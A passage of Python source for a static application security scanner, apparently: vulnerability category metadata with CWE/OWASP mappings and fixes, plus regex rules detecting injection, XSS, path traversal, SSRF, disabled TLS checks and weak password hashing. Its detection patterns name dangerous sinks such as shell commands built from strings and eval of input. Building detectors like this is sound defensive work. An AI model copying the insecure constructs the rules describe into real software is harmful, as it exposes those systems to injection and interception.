        "fix": "Default to private access and encryption, restrict CIDRs to known networks, and "
               "review plan output in CI before apply.",
        "references": ["https://cwe.mitre.org/data/definitions/1188.html"],
    },
    "cicd_permissions": {
        "cwe": "CWE-269",
        "cwe_name": "Improper Privilege Management",
        "owasp": "A03:2025", "api": None, "severity": "High",
        "description": "A workflow grants write-all permissions, uses a mutable action reference, "
                       "or checks out untrusted code in a privileged context.",
        "impact": "A compromised dependency or pull request gains repository write access, publishes "
                  "packages, or steals release credentials.",
        "scenario": "An attacker opens a pull request that modifies a workflow or a dependency; the "
                    "privileged event runs it with the repository token.",
        "fix": "Declare least-privilege 'permissions', pin third-party actions by commit SHA, avoid "
               "pull_request_target with head checkout, and require review for workflow changes.",
        "references": ["https://cwe.mitre.org/data/definitions/269.html",
                       "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"],
    },
    "fail_open_error_handling": {
        "cwe": "CWE-636",
        "cwe_name": "Not Failing Securely",
        "owasp": "A10:2025", "api": None, "severity": "Medium",
        "description": "An error path swallows the exception and continues, or returns success.",
        "impact": "Authentication and authorisation checks are bypassed when the check itself "
                  "throws.",
        "scenario": "An attacker sends input that makes the permission lookup raise, and the "
                    "handler proceeds because the exception was ignored.",
        "fix": "Fail closed: deny on exception, log the failure, and return a generic error to the "
               "caller.",
        "references": ["https://cwe.mitre.org/data/definitions/636.html"],
    },
}

#: Pseudo-languages used by rules that match file *kinds* rather than code.
IAC_LANGUAGES = ("dockerfile", "kubernetes", "terraform", "github-actions", "yaml", "hcl",
                 "cloudformation", "groovy")
CONFIG_LANGUAGES = ("yaml", "json", "toml", "ini", "dotenv", "config", "xml", "properties")


# --------------------------------------------------------------------------- #
# Sources and guards
# --------------------------------------------------------------------------- #
#: Expressions that mark a value as request-derived, per language family.
SOURCE_TOKENS: Tuple[str, ...] = (
    r"request\.(?:args|form|values|json|body|data|files|cookies|GET|POST|headers|query_params|"
    r"query|params|get_json|getParameter|urlencoded)",
    r"req\.(?:body|query|params|cookies|headers|url|files)",
    r"params\[", r"params\.require", r"params\.permit", r"c\.Query\(",
    r"r\.URL\.Query\(\)", r"r\.FormValue\(", r"r\.Form\.Get\(",
    r"\$_GET", r"\$_POST", r"\$_REQUEST", r"\$_COOKIE", r"\$_FILES",
    r"request->(?:input|get|all|post|query|file)\(",
    r"HttpContext\.Request", r"Request\.(?:Query|Form|Body|Headers|Params)",
    r"context\.Request\.Form", r"@RequestParam", r"@PathVariable", r"@RequestBody",
    r"request\.getParameter", r"getParameter\(",
    r"event\[['\"]body", r"ctx\.request", r"fiber\.Ctx",
)

SOURCE_RE = re.compile("|".join(SOURCE_TOKENS))

#: Assignment of a request-derived value to a local variable: the variable is
#: then treated as tainted for the remainder of that file.
TAINT_ASSIGN_RE = re.compile(
    r"(?:let|const|var|val|my|local|var\s+)?\s*([A-Za-z_$][\w$]*)\s*(?::[^=\n]+)?=\s*[^;\n]*?(?:"
    + "|".join(SOURCE_TOKENS) + r")"
)

#: Controls that make a category's pattern safe on the matched line. A guard
#: suppresses the finding and the suppression reason is recorded.
GUARDS: Dict[str, Tuple[str, ...]] = {
    "sql_injection": (
        r"\bexecute\w*\s*\(\s*\w+\s*,\s*[\(\[]",          # execute(sql, (params,))
        r"\bexecute\w*\s*\(\s*\w+\s*,\s*\w+\s*\)",
        r"\?\s*(?:,\s*\?)*\s*['\"]\s*,",                    # placeholder list
        r"\$\d", r"bindParam", r"bindValue", r"setParameter",
        r"\.where\(\s*['\"][^'\"]*=\s*\?",                  # query builder with placeholder
        r"\.filter\(\s*\w+\s*=", r"allow_?list", r"ALLOWED_[A-Z_]+",
    ),
    "nosql_injection": (
        r"\b(?:String|str|parseInt|Number|int|float)\(\s*\w+\s*\)",
        r"typeof\s+\w+\s*===", r"isinstance\(\s*\w+\s*,\s*str\s*\)",
        r"\$eq\s*:", r"allow_?list",
    ),
    "command_injection": (
        r"shell\s*=\s*False", r"shell=False", r"execFile\(", r"\bspawn\(", r"\bsubprocess\.run\(\s*\[",
        r"shlex\.quote", r"escapeshellarg", r"ProcessBuilder\(\s*\[",
        r"exec\.Command\(\s*['\"][^'\"]+['\"]\s*,",         # no shell
        r"allow_?list", r"filepath\.Base\(",
    ),
    "code_injection": (r"ast\.literal_eval", r"JSON\.parse", r"allow_?list"),
    "ssti": (r"autoescape", r"render_template\(\s*['\"]", r"escape\(", r"allow_?list"),
    "ldap_injection": (r"escape_filter_chars", r"ldap_escape", r"filter_escape", r"allow_?list"),
    "xpath_injection": (r"setParameter", r"XPathVariableResolver", r"allow_?list"),
    "header_injection": (r"replace\(\s*['\"][\\r\\n]", r"strip\(\s*['\"][\\r\\n]",
                         r"header_?value_?escape", r"urlencode"),
    "xss_reflected": (r"\bescape\(", r"\bhtml\.escape", r"escapeHtml", r"htmlspecialchars",
                      r"bleach\.clean", r"DOMPurify", r"autoescape=True", r"textContent\s*="),
    "xss_stored": (r"\bescape\(", r"\bhtml\.escape", r"escapeHtml", r"htmlspecialchars",
                   r"bleach\.clean", r"DOMPurify"),
    "path_traversal": (r"realpath", r"secure_filename", r"filepath\.Base", r"os\.path\.basename",
                       r"resolve\(\)\.startsWith", r"path\.resolve\([^)]*\)\s*\.relative",
                       r"allow_?list", r"normpath\([^)]*\)\.startswith"),
    "unrestricted_upload": (r"secure_filename", r"UUID", r"uuid4", r"mime", r"allowed_?(?:ext|types)",
                            r"allow_?list", r"filetype\("),
    "zip_slip": (r"is_relative_to", r"realpath", r"\.startswith\(.*(?:dir|root|base)",
                 r"secure_filename", r"members\s*="),
    "ssrf": (r"allow_?list", r"ALLOWED_HOSTS", r"urlparse\([^)]*\)\.netloc\s+in",
             r"ipaddress\.", r"is_private", r"validate_url"),
    "open_redirect": (r"allow_?list", r"startswith\(\s*['\"]/", r"url_has_allowed_host_and_scheme",
                      r"is_safe_url"),
    "weak_password_hashing": (r"argon2", r"bcrypt", r"scrypt", r"pbkdf2", r"password_hash\(",
                              r"make_password"),
    "weak_jwt_validation": (r"algorithms\s*=\s*\[\s*['\"]RS256", r"verify\(.*algorithms",
                            r"jwt\.verify\(", r"require\(['\"]jsonwebtoken['\"]\)\.verify"),
    "session_management": (r"httponly\s*=\s*True", r"HttpOnly", r"secure\s*=\s*True",
                           r"same_site\s*=\s*['\"]lax", r"os\.environ\[", r"process\.env\."),
    "idor": (r"current_user", r"currentUser", r"req\.user", r"request\.user", r"@AuthenticationPrincipal",
             r"[Tt]enant[_A-Za-z]*", r"[Oo]wner[_A-Za-z]*", r"\.where\([^)]*user_id",
             r"User\.FindFirst", r"IsInRole", r"\bprincipal\b", r"authorize"),
    "csrf": (r"csrf_token", r"CsrfViewMiddleware", r"X-CSRF", r"antiforgery", r"@csrf_protect"),
    "business_logic": (r"server_?side", r"calculate_total", r"from_db", r"allow_?list"),
    "mass_assignment": (r"fillable", r"allowed_?fields", r"only\(\s*\[", r"pick\(", r"@JsonIgnore"),
    "weak_randomness": (r"secrets\.", r"randomBytes", r"randomUUID", r"SecureRandom", r"crypto/rand",
                        r"os\.urandom", r"SystemRandom"),
    "insecure_deserialization": (r"SafeLoader", r"yaml\.safe_load", r"JSON\.parse", r"allow_?list",
                                 r"ObjectInputFilter", r"SerializationBinder"),
    "unsigned_update": (r"compare_digest", r"timingSafeEqual", r"verify_signature", r"stripe\.Webhook"),
    "permissive_cors": (r"allowed_?origins\s*=\s*\[", r"origin\s*:\s*\[", r"allow_?list"),
    "debug_mode": (r"debug\s*=\s*os\.environ", r"debug\s*=\s*process\.env", r"DEBUG\s*=\s*False"),
    "fail_open_error_handling": (r"raise\b", r"throw\b", r"return\s+false", r"abort\("),
    "hardcoded_secret": (r"os\.environ", r"process\.env", r"getenv", r"System\.getenv",
                         r"\$\{", r"\{\{", r"<[A-Z_]+>", r"REDACTED", r"CHANGE_?ME", r"example",
                         r"placeholder", r"dummy", r"test", r"xxx", r"0000"),
}

#: Values that look like secrets but are not: placeholders in templates, empty
#: strings, environment references and obvious dummies. Defined once, in
#: :mod:`finding_model`, so every stage that redacts agrees on what is safe.
SECRET_PLACEHOLDER_RE = fm.SECRET_PLACEHOLDER_RE


# --------------------------------------------------------------------------- #
# Rules
# --------------------------------------------------------------------------- #

def _rule(rule_id: str, category: str, title: str,
          patterns: Sequence[Tuple[str, str]], note: str, *,
          severity: Optional[str] = None, confidence: str = "MEDIUM",
          needs_source: bool = False, guards: Sequence[str] = (),
          max_per_file: int = 25, context: Optional[str] = None,
          context_lines: int = 8,
          extra_references: Sequence[str] = ()) -> Dict[str, Any]:
    """Build one rule record.

    ``patterns`` is a sequence of ``(language, regex)``; ``"*"`` matches any
    source language, ``"iac"`` any infrastructure-as-code language and
    ``"config"`` any configuration language. ``note`` states what this specific
    pattern shows, and is appended to the category's general description.

    ``context`` is an extra anchor: the match only counts when this regex also
    matches the ``context_lines`` lines above it. It exists for rules whose
    pattern is too generic to stand alone -- ``except ...: pass`` is a fail-open
    only when the guarded block decides something security-relevant.
    """
    return {
        "id": rule_id,
        "category": category,
        "title": title,
        "patterns": tuple(patterns),
        "note": note,
        "severity": severity or CATEGORY_META[category]["severity"],
        "confidence": confidence,
        "needs_source": needs_source,
        "guards": tuple(guards) if guards else GUARDS.get(category, ()),
        "max_per_file": max_per_file,
        "context": context,
        "context_lines": context_lines,
        "extra_references": tuple(extra_references),
    }


RULES: List[Dict[str, Any]] = [
    # ------------------------------------------------------------------ SQL --
    _rule("py-sql-concat", "sql_injection", "SQL statement composed from a string",
          (("python", r"""(?:\.execute|\.executemany|\.executescript|\.raw)\s*\(\s*"""
                      r"""(?:f["']|["'][^"'\n]*["']\s*(?:\+|%|\.format\s*\())"""),),
          "A database call receives a statement built with an f-string, concatenation, % or "
          "str.format, so the values are part of the SQL syntax.",
          confidence="HIGH"),
    _rule("js-sql-concat", "sql_injection", "SQL statement composed from a string",
          (("javascript", r"""(?:\.query|\.execute|\.raw)\s*\(\s*(?:`[^`\n]*\$\{|"""
                          r"""["'][^"'\n]*["']\s*\+)"""),
           ("typescript", r"""(?:\.query|\.execute|\.raw)\s*\(\s*(?:`[^`\n]*\$\{|"""
                          r"""["'][^"'\n]*["']\s*\+)""")),
          "A query is executed with a template literal or concatenated string rather than a "
          "placeholder plus parameters.",
          confidence="HIGH"),
    _rule("go-sql-concat", "sql_injection", "SQL statement composed with fmt.Sprintf or +",
          (("go", r"""(?:\.Query|\.QueryRow|\.Exec|\.QueryContext|\.ExecContext|\.Prepare)\s*"""
                 r"""\(\s*(?:fmt\.Sprintf|["'][^"\n]*["']\s*\+)"""),),
          "database/sql receives a statement built with fmt.Sprintf or concatenation.",
          confidence="HIGH"),
    _rule("rb-sql-concat", "sql_injection", "ActiveRecord query built by interpolation",
          (("ruby", r"""(?:where|find_by_sql|order|select|pluck|joins|having|group)\s*"""
                    r"""\(\s*["'][^"\n]*#\{"""),
           ("ruby", r"""execute\s*\(\s*["'][^"\n]*#\{""")),
          "A query fragment contains #{...} interpolation, so request data becomes SQL syntax.",
          confidence="HIGH"),
    _rule("php-sql-concat", "sql_injection", "SQL statement composed by interpolation",
          (("php", r"""(?:->query|->exec|mysqli_query|mysql_query|pg_query)\s*\(\s*"""
                   r"""(?:["'][^"\n]*\$|["'][^"\n]*["']\s*\.)"""),),
          "A query is passed to the driver with a variable interpolated or concatenated into it.",
          confidence="HIGH"),
    _rule("java-sql-concat", "sql_injection", "SQL statement composed with + concatenation",
          (("java", r"""(?:createQuery|createNativeQuery|prepareStatement|executeQuery|"""
                     r"""executeUpdate|execute)\s*\(\s*["'][^"\n]*"\s*\+"""),
           # Kotlin uses the same JDBC/JPA APIs; the pattern is a JDK one, not syntax sugar.
           ("kotlin", r"""(?:createQuery|createNativeQuery|prepareStatement|executeQuery|"""
                       r"""executeUpdate|execute)\s*\(\s*["'][^"\n]*"\s*\+""")),
          "A JPA/JDBC call receives a statement built by string concatenation.",
          confidence="HIGH"),
    _rule("cs-sql-concat", "sql_injection", "SQL statement composed by interpolation",
          (("csharp", r"""(?:SqlCommand|ExecuteReader|ExecuteNonQuery|ExecuteScalar|FromSqlRaw|"""
                       r"""FromSqlInterpolated|ExecuteSqlRaw)\s*\([^)\n]*(?:\$"[^"\n]*\{|"\s*\+)"""),),
          "A command is built from an interpolated or concatenated string instead of parameters.",
          confidence="HIGH"),
    _rule("sql-dynamic-identifier", "sql_injection", "Interpolated identifier in ORDER BY or LIMIT",
          (("python", r"""["'][^"\n]*\b(?:ORDER\s+BY|LIMIT|OFFSET|GROUP\s+BY)\b[^"\n]*\{[A-Za-z_]"""),
           ("javascript", r"""`[^`\n]*\b(?:ORDER\s+BY|LIMIT|OFFSET|GROUP\s+BY)\b[^`\n]*\$\{"""),
           ("java", r"""["'][^"\n]*\b(?:ORDER\s+BY|LIMIT|OFFSET)\b[^"\n]*"\s*\+""")),
          "A sort column, direction or limit is interpolated into the statement. These cannot be "
          "bound as parameters and require an allow-list.",
          severity="Medium", confidence="MEDIUM"),

    # --------------------------------------------------------------- NoSQL --
    _rule("nosql-request-object", "nosql_injection", "Request object passed to a document query",
          (("javascript", r"""\.(?:find|findOne|findOneAndUpdate|updateOne|updateMany|deleteOne|"""
                          r"""deleteMany|aggregate|countDocuments)\s*\(\s*(?:req\.(?:body|query|"""
                          r"""params)|request\.(?:json|form|args|GET|POST))"""),
           ("typescript", r"""\.(?:find|findOne|findOneAndUpdate|updateOne|updateMany|aggregate)\s*"""
                          r"""\(\s*req\.(?:body|query|params)"""),
           ("python", r"""\.(?:find|find_one|update_one|update_many|delete_one|delete_many|"""
                      r"""aggregate|count_documents)\s*\(\s*(?:request\.(?:json|form|args|GET|POST)|"""
                      r"""req\.(?:body|query))""")),
          "A whole request object is used as the query document, so operators such as $ne can be "
          "injected where a scalar value is expected.",
          confidence="HIGH"),
    _rule("nosql-where", "nosql_injection", "$where or $expr evaluation of input",
          (("javascript", r"""\$where\s*:\s*(?:req\.|request\.|`[^`]*\$\{)"""),
           ("python", r"""\$where["']?\s*:\s*(?:request\.|req\.|f["'])""")),
          "JavaScript is evaluated server-side by the database with request data in the expression.",
          confidence="HIGH"),

    # ------------------------------------------------------------- Command --
    _rule("cmd-shell-true", "command_injection", "Shell invoked with a composed command string",
          (("python", r"""subprocess\.(?:run|Popen|call|check_call|check_output)\s*\([^)\n]*"""
                      r"""(?:shell\s*=\s*True|os\.system\s*\(|os\.popen\s*\()"""),),
          "A subprocess runs through a shell, so metacharacters in any interpolated value are "
          "executed.", confidence="HIGH"),
    _rule("cmd-os-system", "command_injection", "os.system/os.popen with a variable",
          (("python", r"""\bos\.(?:system|popen|spawn\w*)\s*\(\s*(?:f["']|[A-Za-z_][\w.]*\s*[+%]|"""
                       r"""[A-Za-z_][\w.]*\s*\))"""),),
          "A command string is executed through the platform shell.",
          needs_source=True, confidence="MEDIUM"),
    _rule("cmd-js-exec", "command_injection", "child_process exec with request data",
          (("javascript", r"""child_process\.(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{|["'][^"\n]*["']"""
                          r"""\s*\+|[A-Za-z_$][\w$]*\s*[+,)])"""),
           ("typescript", r"""child_process\.(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{|"""
                          r"""["'][^"\n]*["']\s*\+|[A-Za-z_$][\w$]*\s*[+,)])""")),
          "exec() starts a shell and receives a command built from variables.",
          needs_source=True, confidence="HIGH"),
    _rule("cmd-php", "command_injection", "PHP shell function with variable input",
          (("php", r"""\b(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(\s*"""
                  r"""[^)\n]*\$"""),),
          "Request data reaches a shell-executing PHP function.",
          needs_source=True, confidence="HIGH"),
    _rule("cmd-ruby", "command_injection", "Ruby shell execution with interpolation",
          (("ruby", r"""(?:system|`|exec|spawn|Open3\.\w+|IO\.popen)\s*[\(`]?[^\n]*#\{"""),),
          "A shell command is built with #{} interpolation.",
          confidence="HIGH"),
    _rule("cmd-go-shell", "command_injection", "exec.Command with sh -c",
          (("go", r"""exec\.Command\s*\(\s*["'](?:sh|bash|/bin/sh|/bin/bash)["']\s*,\s*"""
                 r"""["']-c["']"""),),
          "A shell is started explicitly with a command string, so quoting becomes the only "
          "protection.",
          confidence="HIGH"),
    _rule("cmd-java-runtime", "command_injection", "Runtime.exec with composed command",
          (("java", r"""Runtime\.getRuntime\(\)\.exec\s*\(\s*[^)\n]*(?:\+|String\.format)"""),
           ("kotlin", r"""Runtime\.getRuntime\(\)\.exec\s*\(\s*[^)\n]*(?:\+|String\.format)""")),
          "A command line is assembled by concatenation and passed to the shell-aware Runtime.exec.",
          confidence="HIGH"),
    _rule("cmd-cs-process", "command_injection", "Process.Start with cmd.exe or composed arguments",
          (("csharp", r"""Process\.Start\s*\([^)\n]*(?:cmd\.exe|/c\s|Arguments\s*=\s*\$?")"""),),
          "A new process is started with a shell or assembled arguments.",
          needs_source=True, confidence="MEDIUM"),

    # ---------------------------------------------------------------- Code --
    _rule("code-eval", "code_injection", "Dynamic evaluation of input",
          (("python", r"""\b(?:eval|exec|compile)\s*\(\s*(?:f["']|[A-Za-z_][\w.]*\s*[,)+]|"""
                      r"""["'][^"'\n]*["']\s*\+)"""),
           ("javascript", r"""\beval\s*\(\s*[A-Za-z_$][\w$.]*\s*\)|\bnew\s+Function\s*\("""),
           ("typescript", r"""\beval\s*\(\s*[A-Za-z_$][\w$.]*\s*\)|\bnew\s+Function\s*\("""),
           ("php", r"""\b(?:eval|assert|create_function)\s*\(\s*\$"""),
           ("ruby", r"""\beval\s*\(?\s*(?:params|ARGV|gets|request)""")),
          "The language runtime evaluates a value derived from input rather than a fixed literal.",
          needs_source=True, confidence="HIGH"),

    # ---------------------------------------------------------------- SSTI --
    _rule("ssti-string-template", "ssti", "Template compiled from a string",
          (("python", r"""(?:render_template_string|from_string|Template)\s*\(\s*"""
                      r"""(?:request\.|f["']|[A-Za-z_][\w.]*\s*[,)])"""),
           ("javascript", r"""(?:handlebars|ejs|pug|mustache)\.(?:compile|render)\s*\(\s*"""
                          r"""(?:req\.|[A-Za-z_$][\w$]*\s*[,)])"""),
           ("ruby", r"""(?:render\s+inline:|ERB\.new\(|Liquid::Template\.parse\()\s*[^)\n]*"""
                    r"""(?:params|@)"""),
           ("java", r"""(?:TemplateEngine|Configuration)\.process\s*\(\s*[^)\n]*\+""")),
          "A template is built from a value at runtime; user input then becomes template code.",
          needs_source=True, confidence="HIGH"),

    # ---------------------------------------------------------------- LDAP --
    _rule("ldap-filter-concat", "ldap_injection", "LDAP filter built by concatenation",
          (("python", r"""(?:search|search_s|search_st|search_ext|search_ext_s)\w*\s*\([^)\n]*"""
                      r"""["'][^"\n]*["']\s*(?:\+|%|\.format)"""),
           ("java", r"""(?:search|SearchControls|DirContext)\w*[\s\S]{0,80}?["'][^"\n]*=\s*["']\s*\+"""),
           ("php", r"""ldap_(?:search|read|list)\s*\([^)\n]*\$"""),
           ("csharp", r"""DirectorySearcher\s*\([^)\n]*\$?""")),
          "Directory filter text is assembled from input, so filter syntax can be injected.",
          needs_source=True, confidence="MEDIUM"),

    # --------------------------------------------------------------- XPath --
    _rule("xpath-concat", "xpath_injection", "XPath expression built by concatenation",
          (("python", r"""\.(?:xpath|findall|find)\s*\(\s*["'][^"\n]*(?:/|\[)[^"\n]*["']\s*"""
                      r"""(?:\+|%|\.format)"""),
           ("java", r"""XPath\w*\.(?:compile|evaluate)\s*\(\s*["'][^"\n]*["']\s*\+"""),
           ("javascript", r"""\.(?:xpath|selectNodes|xpathEvaluate)\s*\(\s*["'][^"\n]*["']\s*\+""")),
          "An XPath predicate includes concatenated input, so the predicate can be rewritten.",
          needs_source=True, confidence="MEDIUM"),

    # ------------------------------------------------------ Header / CRLF --
    _rule("header-injection", "header_injection", "Request data copied into a response header",
          (("javascript", r"""(?:setHeader|writeHead|append)\s*\([^)\n]*(?:req\.|request\.)"""),
           ("python", r"""(?:headers|response)\s*\[[^\]]*\]\s*=\s*(?:request\.|f["'][^"\n]*\{)"""),
           ("python", r"""make_response\([^)\n]*request\.args"""),
           ("go", r"""\.Header\(\)\.(?:Set|Add)\s*\([^)\n]*r\.(?:URL|Form)"""),
           ("ruby", r"""headers\[[^\]]*\]\s*=\s*params\["""),
           ("php", r"""header\s*\(\s*["'][^"\n]*["']\s*\.\s*\$"""),
           ("java", r"""setHeader\s*\([^)\n]*getParameter"""),
           ("csharp", r"""Headers\.Add\s*\([^)\n]*Request""")),
          "A header value is taken from the request, so CR/LF in the value can add headers or "
          "split the response.", needs_source=True, confidence="MEDIUM"),

    # ----------------------------------------------------------------- XSS --
    _rule("xss-unsafe-template", "xss_reflected", "Template output marked safe",
          (("python", r"""\|\s*safe\b|\{%\s*autoescape\s+false\s*%\}"""),
           ("ruby", r"""\.html_safe\b|\braw\s*\(|\bsanitize\s*\([^)]*,\s*:tags\s*=>\s*\[\s*\]"""),
           ("javascript", r"""dangerouslySetInnerHTML"""),
           ("typescript", r"""dangerouslySetInnerHTML""")),
          "Output encoding is explicitly bypassed, so any user-controlled value in that expression "
          "is rendered as markup.",
          confidence="MEDIUM"),
    _rule("xss-response-request", "xss_reflected", "Request data written into the response body",
          (("javascript", r"""res\.(?:send|write|end)\s*\(\s*(?:req\.|`[^`]*\$\{req\.)"""),
           ("typescript", r"""res\.(?:send|write|end)\s*\(\s*(?:req\.|`[^`]*\$\{req\.)"""),
           ("python", r"""HttpResponse\s*\(\s*(?:f["'][^"\n]*\{?|request\.)"""),
           ("go", r"""fmt\.Fprintf\s*\(\s*w\s*,[^)\n]*r\.(?:URL|Form)"""),
           ("php", r"""\b(?:echo|print)\s+\$_(?:GET|POST|REQUEST|COOKIE)"""),
           ("java", r"""getWriter\(\)\.(?:print|write)\s*\([^)\n]*(?:getParameter|request\.)"""),
           ("csharp", r"""Response\.Write\s*\([^)\n]*Request""")),
          "A response is written with request data and no escaping call on the line.",
          confidence="HIGH"),
    _rule("xss-innerhtml", "xss_reflected", "DOM sink assigned from a URL or storage",
          (("javascript", r"""(?:innerHTML|outerHTML|document\.write)\s*=\s*"""
                          r"""(?:location\.|document\.URL|window\.name|localStorage|sessionStorage)"""),
           ("typescript", r"""(?:innerHTML|outerHTML)\s*=\s*(?:location\.|document\.URL|localStorage)""")),
          "A DOM HTML sink is assigned from a browser-controlled source, which is exploitable "
          "without any server-side flaw.",
          confidence="HIGH"),

    # -------------------------------------------------------------- Stored --
    _rule("xss-stored-unsafe", "xss_stored", "Stored value rendered without escaping",
          (("python", r"""<[^>\n]*\{\{?\s*\w+(?:\.\w+)*\s*\|?\s*(?:safe)?\s*\}"""),
           ("ruby", r"""<%=\s*(?:@|raw\()"""),
           ("php", r"""(?:echo|print)\s+\$(?!_)[A-Za-z_]\w*\s*;""")),
          "A template prints a stored field with no escaping filter. Confirm whether the value is "
          "user-controlled before accepting the finding.",
          severity="Medium", confidence="LOW", max_per_file=10),

    # ------------------------------------------------------- Path traversal --
    _rule("path-traversal", "path_traversal", "Request data used to build a file path",
          (("python", r"""(?:open|Path|os\.path\.join|send_file|send_from_directory)\s*\([^)\n]*"""
                      r"""(?:request\.|params\[|f["'][^"\n]*\{[^}]*(?:request|args|name))"""),
           ("javascript", r"""fs\.(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync|"""
                          r"""unlink)\w*\s*\([^)\n]*req\.(?:query|params|body)"""),
           ("typescript", r"""fs\.(?:readFile|readFileSync|createReadStream|writeFile)\w*\s*\([^)\n]*"""
                          r"""req\.(?:query|params|body)"""),
           ("go", r"""os\.(?:Open|OpenFile|ReadFile|Create)\s*\([^)\n]*r\.(?:URL\.Query|FormValue)"""),
           ("ruby", r"""File\.(?:read|open|new|write)\s*\([^)\n]*params\["""),
           ("php", r"""(?:file_get_contents|fopen|readfile|include|require|unlink)\s*\(?\s*"""
                  r"""\$_(?:GET|POST|REQUEST|COOKIE)"""),
           ("java", r"""(?:new\s+File|Paths\.get|Files\.(?:readAllBytes|newInputStream))\s*\([^)\n]*"""
                    r"""getParameter"""),
           ("kotlin", r"""(?:new\s+File|Paths\.get|Files\.(?:readAllBytes|newInputStream))\s*\([^)\n]*"""
                      r"""getParameter"""),
           ("csharp", r"""File\.(?:ReadAllText|ReadAllBytes|OpenRead|WriteAllText)\s*\([^)\n]*Request""")),
          "A caller-controlled value is joined into a filesystem path with no canonicalisation call "
          "on the line.",
          confidence="HIGH"),
    _rule("upload-filename", "unrestricted_upload", "Upload stored under the supplied filename",
          (("python", r"""(?:\.save|shutil\.copy|open)\s*\([^)\n]*(?:file\.filename|request\.files)"""),
           ("javascript", r"""\.(?:mv|rename)\s*\(\s*(?:req\.file|file)\.(?:originalname|name)"""),
           ("php", r"""move_uploaded_file\s*\([^)\n]*\$_FILES"""),
           ("ruby", r"""(?:File\.open|IO\.copy_stream)\s*\([^)\n]*params\[:?file\]"""),
           ("java", r"""transferTo\s*\(\s*new\s+File\s*\([^)\n]*getOriginalFilename"""),
           ("csharp", r"""SaveAs\s*\([^)\n]*(?:FileName|Request\.Files)""")),
          "The stored name comes from the upload, so the client chooses the extension and "
          "directory.",
          confidence="HIGH"),
    _rule("zip-extract", "zip_slip", "Archive extracted without entry validation",
          (("python", r"""\.extractall\s*\(\s*\)"""),
           ("javascript", r"""\bunzip(?:Sync)?\s*\("""),
           ("php", r"""->extractTo\s*\("""),
           ("ruby", r"""Gem::Package\.new\([^)]*\)\.extract_files"""),
           ("java", r"""ZipInputStream[\s\S]{0,400}?getNextEntry""")),
          "All archive entries are written to disk; an entry named ../ escapes the destination.",
          confidence="MEDIUM", max_per_file=5),

    # ---------------------------------------------------------------- SSRF --
    _rule("ssrf-request-url", "ssrf", "Outbound request to a request-supplied URL",
          (("python", r"""\b(?:requests|httpx|aiohttp|urllib\.request|urlopen)\b[\s\S]{0,80}?"""
                      r"""(?:requests\.(?:get|post|put|delete|head|patch|request)|urlopen)\s*\([^)\n]*"""
                      r"""(?:request\.|params\[|args\[|url)"""),
           ("javascript", r"""\b(?:fetch|axios(?:\.\w+)?|got|request|nodeFetch|superagent)\s*\([^)\n]*"""
                          r"""(?:req\.|params\.|body\.|url)"""),
           ("typescript", r"""\b(?:fetch|axios(?:\.\w+)?|got)\s*\([^)\n]*(?:req\.|params\.|body\.|url)"""),
           ("go", r"""http\.(?:Get|Post|Head|NewRequest)\w*\s*\([^)\n]*(?:r\.URL|r\.FormValue|req\.)"""),
           ("ruby", r"""Net::HTTP[\s\S]{0,120}?(?:params\[|@\w*url)"""),
           ("php", r"""curl_setopt\s*\([^,]+,\s*CURLOPT_URL\s*,\s*\$"""),
           ("java", r"""(?:new\s+URL|HttpRequest\.newBuilder|HttpClient\.newHttpClient)\([^)\n]*"""
                    r"""(?:getParameter|request\.)"""),
           ("csharp", r"""(?:HttpClient|WebRequest\.Create)\w*[\s\S]{0,60}?Request\.(?:Query|Form)""")),
          "The server makes an outbound request to a destination chosen by the caller.",
          confidence="HIGH"),

    # ------------------------------------------------------ Open redirect --
    _rule("open-redirect", "open_redirect", "Redirect target taken from the request",
          (("javascript", r"""res\.redirect\s*\(\s*(?:req\.|`[^`]*\$\{req\.)"""),
           ("typescript", r"""res\.redirect\s*\(\s*req\."""),
           ("python", r"""(?:redirect|HttpResponseRedirect)\s*\(\s*(?:request\.|f["'][^"\n]*\{)"""),
           ("go", r"""http\.Redirect\w*\s*\([^)\n]*r\.(?:URL|FormValue)"""),
           ("ruby", r"""redirect_to\s*\(?\s*params\["""),
           ("php", r"""header\s*\(\s*["']Location:[^"\n]*["']\s*\.\s*\$"""),
           ("java", r"""sendRedirect\s*\(\s*(?:request\.getParameter|getParameter)"""),
           ("csharp", r"""Redirect\s*\(\s*Request""")),
          "The destination of a redirect comes from the request, so the application can be used as "
          "a trusted launchpad.",
          confidence="HIGH"),

    # ---------------------------------------------------------- TLS checks --
    _rule("tls-verify-off", "tls_verification_disabled", "TLS certificate validation disabled",
          (("python", r"""\bverify\s*=\s*False|ssl\._create_unverified_context|"""
                      r"""CERT_NONE|check_hostname\s*=\s*False"""),
           ("javascript", r"""rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED|"""
                          r"""strictSSL\s*:\s*false"""),
           ("typescript", r"""rejectUnauthorized\s*:\s*false|strictSSL\s*:\s*false"""),
           ("go", r"""InsecureSkipVerify\s*:\s*true"""),
           ("ruby", r"""verify_mode\s*=\s*OpenSSL::SSL::VERIFY_NONE"""),
           ("php", r"""CURLOPT_SSL_VERIFYPEER\s*,\s*(?:false|0)|verify_peer['\"]?\s*=>\s*false"""),
           ("java", r"""TrustAllCerts|checkServerTrusted\s*\([^)]*\)\s*\{\s*\}|ALLOW_ALL_HOSTNAME"""),
           ("csharp", r"""ServerCertificateCustomValidationCallback\s*=\s*\(?[^)]*=>\s*true|"""
                        r"""RemoteCertificateValidationCallback[^;]*return\s+true""")),
          "Certificate validation is turned off for outbound TLS, which removes authentication of "
          "the peer.",
          confidence="HIGH"),

    # ------------------------------------------------------------- AuthN --
    _rule("weak-password-hash", "weak_password_hashing", "Fast hash used for passwords",
          (("python", r"""hashlib\.(?:md5|sha1|sha256)\s*\([^)\n]*(?:password|passwd|pwd|secret)"""),
           ("javascript", r"""createHash\s*\(\s*['"](?:md5|sha1|sha256)['"]\s*\)[^\n]*"""
                          r"""(?:password|passwd|pwd)"""),
           ("typescript", r"""createHash\s*\(\s*['"](?:md5|sha1)['"]\s*\)[^\n]*(?:password|pwd)"""),
           ("php", r"""\b(?:md5|sha1)\s*\(\s*\$(?:password|passwd|pwd)"""),
           ("ruby", r"""Digest::(?:MD5|SHA1)\.(?:hexdigest|digest)[^\n]*(?:password|passwd)"""),
